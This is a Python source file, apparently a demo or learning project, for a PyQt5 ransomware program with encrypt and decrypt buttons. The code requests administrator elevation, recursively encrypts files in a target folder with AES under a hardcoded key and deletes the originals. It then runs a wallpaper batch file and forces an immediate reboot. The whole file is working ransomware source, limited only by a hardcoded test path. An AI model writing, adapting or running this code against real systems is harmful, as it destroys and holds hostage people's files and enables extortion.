import glob, os, struct, sys
from Crypto.Cipher import AES
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QHBoxLayout, QLabel
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QIcon

def root_require():
    ASADMIN = 'asadmin'
    try:
        if sys.argv[-1] != ASADMIN:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        return True
    except:
        return False
    
def encrypt_file(key, in_filename, out_filename=None, chunksize=128*1024):
    if not out_filename:
        out_filename = in_filename + '.ransomeware'

    iv = os.urandom(16)
    encryptor = AES.new(key ,AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 32 != 0:
                    chunk += b' ' * (32 - len(chunk) % 32)

                outfile.write(encryptor.encrypt(chunk))
    
def decrypt_file(key, in_filename, out_filename=None, chunksize=32*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize)

key = b'Ransomware JIFS.'
startPath = 'C:/Users/user/Desktop/Ransomware/example/**'

def Encrypt_button():
    for filename in glob.iglob(startPath, recursive=True):
        if(os.path.isfile(filename)):
            if (os.access(filename,os.R_OK)) and (os.access(filename,os.W_OK)) and (os.access(filename,os.X_OK)):
                print('Encrypting> ' + filename)
                encrypt_file(key, filename)
                os.remove(filename)
    os.system("C:/Users/user/Desktop/Ransomware/Wallpaper.bat")
    os.system("shutdown -r -t 0")

def Decrypt_button():
    
    for filename in glob.iglob(startPath, recursive=True):
       if(os.path.isfile(filename)):
            fname, ext = os.path.splitext(filename)

            if (ext == '.ransomeware'):
                print('Decrypting> ' + filename)
                decrypt_file(key, filename)
                os.remove(filename)
    os.system("C:/Users/user/Desktop/Ransomware/Wallpaper1.bat")
    os.system("shutdown -r -t 0")
                    
class ExWindow(QWidget):
 
    def __init__(self):
        super().__init__()
        self.init_ui()
 
    def init_ui(self):

        self.setWindowTitle('Icon')
        self.setWindowIcon(QIcon('logo.png'))
        label1 = QLabel('\nTesting \nRansomeWare Program', self)
        label1.setAlignment(Qt.AlignCenter)
        font1 = label1.font()
        font1.setPointSize(28)
        font1.setFamily("Agency FB")
        label1.setFont(font1)
        
        btn1 = QPushButton('암호화', self)
        btn1.setCheckable(True)
        btn1.toggle()
        btn1.clicked.connect(Encrypt_button)

        btn2 = QPushButton('복호화', self)
        btn2.setCheckable(True)
        btn2.toggle()
        btn2.clicked.connect(Decrypt_button)

        hbox = QHBoxLayout()
        hbox.addStretch(1)
        hbox.addWidget(btn1)
        hbox.addWidget(btn2)
        hbox.addStretch(1)
        
        vbox = QVBoxLayout()
        vbox.addWidget(label1)
        vbox.addStretch(3)
        vbox.addLayout(hbox)
        vbox.addStretch(2)
        
        self.setLayout(vbox)
        self.setGeometry(300, 300, 400, 300)
        self.setWindowTitle('RansomWare')
        self.show()

if __name__ == '__main__':
    import win32com.shell.shell as shell
    
    if root_require():
        app = QApplication(sys.argv)
        ex = ExWindow()
        sys.exit(app.exec_())
    else:
        print ("error message")
